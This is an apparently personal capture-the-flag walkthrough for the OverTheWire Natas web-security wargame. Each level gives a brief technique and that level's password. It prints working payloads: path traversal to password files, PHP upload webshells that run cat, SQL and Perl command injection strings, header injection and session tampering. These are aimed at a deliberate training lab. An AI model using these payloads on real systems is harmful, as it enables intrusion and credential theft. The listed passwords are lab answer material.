## natas1:
inspect 
The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq 

## natas2:
dev tools f12
The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

## natas3:
check natas2.natas.labs.overthewire.org/files
check users.txt
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

## natas4:

inspect -> can't even find in google -> check robot.txt
find s3cr3t route -> open users.txt

natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

## natas5:
send request from natas5 to find the password

import requests
url  = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = ('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ' )
s.headers.update({'referer': referer })
r = s.get(url)

print(r.text)


## natas6:
set loggedin cookie to 1

0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## natas 7:
find secret in includes/secret.inc

bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## natas8:
check source code
password found in /etc/natas_webpass/natas8
```
ttp://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../../etc/natas_webpass/natas8
```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## natas9:
decode secret
from hex -> reverse string -> from base64
secret = oubWYf2kBq

password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## natas10:
include grep command inside the grep command
-e 1 /etc/natas_webpass/natas10 
password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

## natas11:
read all files using a wildcard
.* /etc/natas_webpass/natas11

password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

## natas12:
known plaintext attack
check the script natas11.py

password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB


## natas13:
upload php file to print the password

<? php echo system("cat /etc/natas_webpass/natas13"); ?>
change the extension by intercepting the POST request in burp suite

password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

## natas14:
use bitmap file extension instead of php
BMP<?
echo system("cat /etc/natas_webpass/natas14"); 
?>

password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

## natas15
SQL injection
user" OR 1=1#

password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## natas16:
Blind SQL injection
See natas15.py script 
password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

## natas17:
Blind command substitution, i.e. we insert a command that returns TRUE or FALSE for the character being in the password

see natas16.py script 
condition is TRUE => len(r.text ) == 1105
condition is FALSE => len(r.text) =!= 1105 
password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

## natas18:
Blind SQL injection with sleep for checking condition

see natas17.py script

password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

## natas19:
We bruteforce the value of the PHPSESSID of admin (between 0 and 640)
see natas18.py script

password : tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

## natas20:
Same as natas18 but the IDs are not sequential
The ID is in Hex  str(x for x in 1000)-{username}
see natas19.py script

password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

## natas21:
with ?debug as a param in the url, we inject admin admin1 in the username .
in the `mywrite()` function, we are writing each `$key` and `$value` pair with a new line, so we inject `admin 1` with a new line.

We can use this payload directly: http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201

password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

## natas22
use `?submit&admin=1` to get the admin PHPSESSID cookie from the experimental webiste.
Since both of the websites are colocated, we can cross-use the cookie with the admin access

password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

## natas23:
set revelio to 1 by adding the param `?revelio=1` in the GET request

in BurpSuite change the GET location from `/` to `/?revelio=1`

password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

## natas24:
extend the length to 10 by adding random 3 chars to the iloveyou password as `strstr()` function in PHP checks only the occurence not the exact match

password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

## natas25:
Try to show the warning for the strcmp function:
`?passwd[]= 0`

password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

## natas26:
inject the path for the password in the lang parameter
Since the code checks for `../` for stopping directory traversal, we will bypass that by using `.../.../` instead
Then we inject `<?php include '/etc/natas_webpass/natas26'; ?>` in `User-Agent` header

password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

## natas27:
In the drawing cookie we decode from base64 then we unserialize the PHP code
```php
array (
  0 => 
  array (
    'x1' => '1',
    'y1' => '1',
    'x2' => '1',
    'y2' => '1',
  ),
)
```
So we can  create a custom version of **Logger**, serialize our malicious img payload, base64 encode it, then inject it in the drawing cookie

see natas26.php / natas26.py script for the creation of the cookie

password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

## natas28:
If we create a user ( username not in the database) with an empty password we get the data.
We first create a new natas28 user as following: 
`printf 'natas28%64s%s\n' '' 'something'`
We login with natas28 with empty password to find the password for natas28

see natas28.py script 

password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

## natas29:

We use ECB cipher for the encryption. Each block is 16 bytes long.
We also see that we could use an SQL injection in the search bar
The character `\` is use for escaping the block => changing the encryption

So to bypass the input sanitization, we use the following query: 
Block 1 --------- Block 2 ------------------- Block x -------------
AAAAAAAAAA'  | SQL injection (10 chars) | more sqli (10 chars)

see natas29.py / natas29fixed.py scripts

password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

## natas30:
Command injection in perl
In the url we inject the commands in the file parameter
To find the password we use this url:
`http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/nat%22%22as30%00`

password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

## natas31:
We found a Mysql database in the source code => sql injection
quote() sanitizes input by removing quotations BUT vulnerable to **array injection**

See natas30.py script

password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

## natas32: 
Command injection in the POST parameters
use `index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|` to retrieve the password
also add the following header of the Submit query:

```
------WebKitFormBoundary<query_id_from_the_request>
Content-Disposition: form-data; name="file"; filename="sample.csv"
Content-Type: text/csv
```
password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

## natas33:
Same as previous, but we need to find a binary in the webroot and execute it to get the password

We find the **getpassword** file 

Exactly like the previous exploit use this parameter in the POST query: 
`/index.pl?./getpassword%20|


password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ


## natas34:
Vulnerability in PHP deserialization. Check this [paper](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
Interesting writeup: https://anyafachri.medium.com/rce-via-php-archive-metadata-deserialization-natas33-level-finale-overthewire-write-up-bddbb3818618

password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY

# THE END 